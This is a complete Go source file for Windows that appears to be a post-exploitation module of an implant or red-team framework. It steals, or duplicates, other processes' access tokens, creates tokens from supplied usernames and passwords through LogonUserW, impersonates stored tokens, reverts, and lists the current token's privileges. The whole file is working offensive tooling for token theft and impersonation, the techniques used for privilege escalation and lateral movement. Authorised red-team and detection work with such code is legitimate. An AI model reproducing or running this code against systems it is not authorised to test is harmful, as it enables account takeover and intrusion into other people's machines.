//go:build windows

package token

import (
	"fmt"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	logon32LogonInteractive    = 2
	logon32LogonNewCredentials = 9
	logon32ProviderDefault     = 0
)

var (
	modAdvapi32 = windows.NewLazySystemDLL("advapi32.dll")

	procLogonUserW              = modAdvapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUser = modAdvapi32.NewProc("ImpersonateLoggedOnUser")
	procLookupPrivilegeNameW    = modAdvapi32.NewProc("LookupPrivilegeNameW")
)

type entry struct {
	token windows.Token
	info  Info
}

type windowsManager struct {
	mu      sync.Mutex
	entries map[string]*entry
	nextID  int
}

func newPlatformManager() Manager {
	return &windowsManager{entries: make(map[string]*entry)}
}

// List reports the current process token and every token held by the manager.
func (m *windowsManager) List() ([]Info, error) {
	current, err := currentInfo()
	if err != nil {
		return nil, err
	}

	m.mu.Lock()
	out := make([]Info, 0, len(m.entries)+1)
	out = append(out, current)
	for _, e := range m.entries {
		out = append(out, e.info)
	}
	m.mu.Unlock()

	sort.Slice(out, func(i, j int) bool { return out[i].ID < out[j].ID })
	return out, nil
}

// Steal duplicates the primary token of pid. The token is stored; it is not
// impersonated until Impersonate names it.
func (m *windowsManager) Steal(pid int) (Info, error) {
	if pid <= 0 {
		return Info{}, fmt.Errorf("invalid PID: %d", pid)
	}

	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		return Info{}, fmt.Errorf("opening process %d: %w", pid, err)
	}
	defer windows.CloseHandle(h)

	var src windows.Token
	if err := windows.OpenProcessToken(h, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &src); err != nil {
		return Info{}, fmt.Errorf("opening token of process %d: %w", pid, err)
	}
	defer src.Close()

	var dup windows.Token
	if err := windows.DuplicateTokenEx(src, windows.MAXIMUM_ALLOWED, nil,
		windows.SecurityImpersonation, windows.TokenImpersonation, &dup); err != nil {
		return Info{}, fmt.Errorf("duplicating token of process %d: %w", pid, err)
	}

	user, err := tokenUser(dup)
	if err != nil {
		dup.Close()
		return Info{}, err
	}

	m.mu.Lock()
	defer m.mu.Unlock()
	m.nextID++
	info := Info{
		ID:        fmt.Sprintf("t%d", m.nextID),
		PID:       pid,
		User:      user,
		Kind:      "stolen",
		CreatedAt: time.Now().UTC(),
	}
	m.entries[info.ID] = &entry{token: dup, info: info}
	return info, nil
}

// Make logs on with explicit credentials and stores the resulting token.
// logonType is "interactive" (default) or "network" (new credentials).
func (m *windowsManager) Make(username, password, domain, logonType string) (Info, error) {
	if username == "" {
		return Info{}, fmt.Errorf("username is required")
	}
	if password == "" {
		return Info{}, fmt.Errorf("password is required")
	}

	var lt uint32
	switch strings.ToLower(strings.TrimSpace(logonType)) {
	case "", "interactive":
		lt = logon32LogonInteractive
	case "network", "new_credentials":
		lt = logon32LogonNewCredentials
	default:
		return Info{}, fmt.Errorf("unsupported logon type %q (want interactive or network)", logonType)
	}

	u, err := windows.UTF16PtrFromString(username)
	if err != nil {
		return Info{}, err
	}
	d, err := windows.UTF16PtrFromString(domain)
	if err != nil {
		return Info{}, err
	}
	p, err := windows.UTF16PtrFromString(password)
	if err != nil {
		return Info{}, err
	}

	var tok windows.Token
	ret, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(u)),
		uintptr(unsafe.Pointer(d)),
		uintptr(unsafe.Pointer(p)),
		uintptr(lt),
		uintptr(logon32ProviderDefault),
		uintptr(unsafe.Pointer(&tok)),
	)
	if ret == 0 {
		return Info{}, fmt.Errorf("LogonUser(%s\\%s): %w", domain, username, callErr)
	}

	user, err := tokenUser(tok)
	if err != nil {
		tok.Close()
		return Info{}, err
	}

	m.mu.Lock()
	defer m.mu.Unlock()
	m.nextID++
	info := Info{
		ID:        fmt.Sprintf("t%d", m.nextID),
		User:      user,
		Kind:      "made",
		CreatedAt: time.Now().UTC(),
	}
	m.entries[info.ID] = &entry{token: tok, info: info}
	return info, nil
}

// Impersonate applies a stored token to a locked OS thread, reads back the
// effective identity, then reverts. The identity proves the token works
// without leaking impersonation into a later task.
func (m *windowsManager) Impersonate(id string) (Info, error) {
	m.mu.Lock()
	e, ok := m.entries[id]
	m.mu.Unlock()
	if !ok {
		return Info{}, fmt.Errorf("unknown token %q", id)
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	ret, _, callErr := procImpersonateLoggedOnUser.Call(uintptr(e.token))
	if ret == 0 {
		return Info{}, fmt.Errorf("ImpersonateLoggedOnUser(%s): %w", id, callErr)
	}
	defer windows.RevertToSelf()

	var threadTok windows.Token
	if err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &threadTok); err != nil {
		return Info{}, fmt.Errorf("reading impersonation token: %w", err)
	}
	defer threadTok.Close()

	user, err := tokenUser(threadTok)
	if err != nil {
		return Info{}, err
	}
	return Info{ID: id, PID: e.info.PID, User: user, Kind: e.info.Kind, CreatedAt: e.info.CreatedAt}, nil
}

// Revert closes every stored token and reports how many handles were cleared.
// Impersonation itself is already reverted at the end of each task.
func (m *windowsManager) Revert() (int, error) {
	m.mu.Lock()
	defer m.mu.Unlock()
	n := len(m.entries)
	for id, e := range m.entries {
		e.token.Close()
		delete(m.entries, id)
	}
	return n, nil
}

// Privileges lists the current process token's privileges.
func (m *windowsManager) Privileges() ([]Privilege, error) {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok); err != nil {
		return nil, fmt.Errorf("opening current process token: %w", err)
	}
	defer tok.Close()
	return privilegesOf(tok)
}

// Close releases every stored token handle.
func (m *windowsManager) Close() error {
	_, err := m.Revert()
	return err
}

func currentInfo() (Info, error) {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &tok); err != nil {
		return Info{}, fmt.Errorf("opening current process token: %w", err)
	}
	defer tok.Close()
	user, err := tokenUser(tok)
	if err != nil {
		return Info{}, err
	}
	return Info{ID: "current", User: user, Kind: "current"}, nil
}

func tokenUser(tok windows.Token) (string, error) {
	u, err := tok.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("reading token user: %w", err)
	}
	account, domain, _, err := u.User.Sid.LookupAccount("")
	if err != nil {
		return u.User.Sid.String(), nil
	}
	if domain == "" {
		return account, nil
	}
	return domain + `\` + account, nil
}

func privilegesOf(tok windows.Token) ([]Privilege, error) {
	buf := make([]byte, 1024)
	var n uint32
	for {
		err := windows.GetTokenInformation(tok, windows.TokenPrivileges, &buf[0], uint32(len(buf)), &n)
		if err == nil {
			break
		}
		if err == windows.ERROR_INSUFFICIENT_BUFFER {
			buf = make([]byte, n)
			continue
		}
		return nil, fmt.Errorf("reading token privileges: %w", err)
	}

	tp := (*windows.Tokenprivileges)(unsafe.Pointer(&buf[0]))
	attrs := unsafe.Slice(&tp.Privileges[0], tp.PrivilegeCount)
	out := make([]Privilege, 0, len(attrs))
	for _, a := range attrs {
		out = append(out, Privilege{
			Name:    privilegeName(a.Luid),
			Enabled: a.Attributes&windows.SE_PRIVILEGE_ENABLED != 0,
		})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Name < out[j].Name })
	return out, nil
}

func privilegeName(luid windows.LUID) string {
	var buf [256]uint16
	size := uint32(len(buf))
	ok, _, _ := procLookupPrivilegeNameW.Call(
		0,
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)
	if ok == 0 {
		return fmt.Sprintf("LUID-%d-%d", luid.HighPart, luid.LowPart)
	}
	return windows.UTF16ToString(buf[:size])
}
